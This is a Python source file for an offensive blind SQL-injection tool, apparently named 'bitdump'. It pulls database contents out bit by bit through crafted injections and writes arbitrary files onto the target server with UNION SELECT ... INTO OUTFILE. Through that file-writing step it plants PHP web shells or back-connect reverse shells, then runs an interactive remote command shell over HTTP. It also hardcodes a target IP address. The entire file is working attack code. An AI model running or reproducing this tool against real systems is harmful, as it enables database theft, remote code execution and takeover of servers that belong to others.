import time, urllib.parse, urllib.request, socket, math

TIMEOUT = 2
MAX_TIMEOUTS = 5

class TimeoutLimitError(Exception):

    def __init__(self, url, timeouts):
        self.url = url
        self.timeouts = timeouts

class InjectionError(Exception):
    pass

class Injector:

    def __init__(self, url, success, delay, attack_field, other_fields, stringExecutor, charExecutor):
        self.url = urllib.parse.urlparse(url, "http")
        self.success = success
        self.delay = (delay/1000)
        self.attack_field = attack_field
        self.other_fields = other_fields
        self.stringExecutor = stringExecutor
        self.charExecutor = charExecutor
        self.test()

    def test(self):
        if not self.checkBit("1=1"):
            raise InjectionError

    def post(self, data, url=None):
        req = None
        timeouts = 0
        url = urllib.parse.urlunparse(self.url).replace("///", "//") if url is None else url
        
        while req is None:
            if timeouts == MAX_TIMEOUTS:
                raise TimeoutLimitError(url, timeouts)
            try:
                req = urllib.request.urlopen(urllib.request.Request(url, urllib.parse.urlencode(data).encode('ascii')), timeout=TIMEOUT);
            except (socket.timeout, urllib.error.URLError):
                timeouts += 1
        return req.read().decode(req.headers.get_content_charset())

    def runInjection(self, inj, url=None):
        time.sleep(self.delay)
        data = self.other_fields.copy()
        data[self.attack_field] = inj
        res = self.post(data)
        return self.success in res

    def checkBit(self, check):
        return self.runInjection("' OR (%s) -- '" % check)

    def getNumberInRange(self, obj, lower, upper):
        diff = upper-lower
        if diff == 0:
            return lower
        if diff == 1:
            return upper if self.checkBit("(%s)=%d" % (obj, upper)) else lower
        mid = lower+math.floor(diff/2)
        return self.getNumberInRange(obj, lower, mid) if self.checkBit("(%s)<=%d" % (obj, mid)) else self.getNumberInRange(obj, mid, upper)

    def getNumber(self, obj):
        if self.checkBit("(%s) IS NULL OR (%s)=0" % (obj, obj)):
            return 0
        num = 1
        while not self.checkBit("(%s)<=%d" % (obj, num)):
            num *= 2
        return self.getNumberInRange(obj, math.floor(num/2), num)

    def getCount(self, table, where="1=1"):
        if where is None:
            where = "1=1"
        return self.getNumber("SELECT COUNT(*) FROM %s.%s WHERE %s"
                              % (table.schema, table.name, where))

    def getLen(self, obj):
        return self.getNumber("LENGTH((%s))" % obj)

    def getChar(self, obj, index):
        binstr = ''.join(list(self.charExecutor.map(
            (lambda x: "1" if
             self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
                           % (obj, index, x))
             else "0"), range(1, 8))))
        c = int(binstr, 2).to_bytes(15//8, 'big').decode()
        return c

    def getString(self, obj):
        namelen = self.getLen(obj)
        name = ''.join(list(self.stringExecutor.map(
            (lambda x: self.getChar(obj, x)),
            range(1, namelen+1))))
        return name

    def getDataFromTable(self, column, table, index=0, where="1=1"):
        if where is None:
            where = "1=1"
        tablename = table.name if table.schema is None else "%s.%s" % (table.schema, table.name)
        return self.getString("SELECT %s FROM %s WHERE %s LIMIT %d,1"
                              % (column, tablename, where, index))

    def getNumCols(self, num=1):
        nulls = ", NULL"*(num-1)
        return num if self.runInjection("' UNION SELECT 1%s -- '" % nulls) else self.getNumCols(num+1)

    def getUrlRoot(self):
        return "%s://%s/" % (self.url.scheme, (self.url.netloc+self.url.path).split("/")[0])

    def injectStringAsFile(self, contents, filepath):
        nulls = ', NULL'*(self.getNumCols()-1)
        inj = "'UNION SELECT '%s'%s INTO OUTFILE '%s' FIELDS ESCAPED BY '' -- '" % (contents.rstrip(), nulls, filepath)
        self.runInjection(inj, "http://152.7.99.212/injection2.php")

    def injectFile(self, filename, target_filepath):
        with open(filename, 'r') as f:
            self.injectStringAsFile(f.read(), target_filepath)

    def injectBinFile(self, filename, target_filepath):
        with open(filename, 'rb') as f:
            a = list(f.read())
            b = ''.join("%02x" % x for x in a)
            nulls = ", X'00'"*(self.getNumCols()-1)
            inj = "'UNION SELECT X'%s'%s INTO DUMPFILE '%s' -- '" % (b, nulls, target_filepath)
            self.runInjection(inj)

    def injectBackconnect(self, filename, target_filepath, host, port):
        with open(filename, 'r') as f:
            a = f.read().replace("<HOST>", host).replace("<PORT>", port)
            self.injectStringAsFile(a, target_filepath)

    def injectMySQLShell(self, webroot, host, username, password, database, filename="index3.php"):
        with open('./shell-wrappers/php-mysql.php', 'r') as f:
            contents = f.read()
            contents = contents.replace("<HOST>", host)
            contents = contents.replace("<USERNAME>", username)
            contents = contents.replace("<PASSWORD>", password)
            contents = contents.replace("<DATABASE>", database)
            self.injectStringAsFile(contents, webroot+filename)
        return Shell(self.getUrlRoot(), filename, self.getNumCols())

    def injectShell(self, webroot, filename="index2.php"):
        filepath = webroot + filename
        self.injectFile('./shell-wrappers/php-web.php', filepath)
        return Shell(self.getUrlRoot(), filename, self.getNumCols())


class Shell:

    promptCmd = "echo [$USER@${HOSTNAME%%.*} ${PWD##*/}]"
    timeoutResponse = "[bitdump] Request timed out!\n"

    def __init__(self, urlroot, filename, numCols):
        self.urlroot = urlroot
        self.filename = filename
        self.shellURL = urlroot+filename
        self.endPad = (numCols*-3)+2
        self.basePrompt = " "
        self.cwd = self.executeRaw("pwd").rstrip()
        while self.cwd == Shell.timeoutResponse:
            self.cwd = self.executeRaw("pwd").rstrip()
        

    def prompt(self):
        prompt = self.execute(":")
        if prompt == Shell.timeoutResponse:
            prompt = "# "
        self.basePrompt = prompt
        return prompt

    def execute(self, cmd):
        cmd = "cd %s; %s; %s; pwd" % (self.cwd, cmd, Shell.promptCmd)
        try:
            req = urllib.request.urlopen(urllib.request.Request(self.shellURL, urllib.parse.urlencode({"a": cmd}).encode('ascii')), timeout=TIMEOUT);
        except (socket.timeout, urllib.error.URLError):
            return Shell.timeoutResponse+self.basePrompt
        response = req.read().decode(req.headers.get_content_charset())
        spl = response.rsplit("\n", 2)
        self.cwd = spl[1] 
        return spl[0]+"$ "

    def executeRaw(self, cmd):
        try:
            req = urllib.request.urlopen(urllib.request.Request(self.shellURL, urllib.parse.urlencode({"a": cmd}).encode('ascii')), timeout=TIMEOUT);
        except (socket.timeout, urllib.error.URLError):
            return Shell.timeoutResponse
        return req.read().decode(req.headers.get_content_charset())
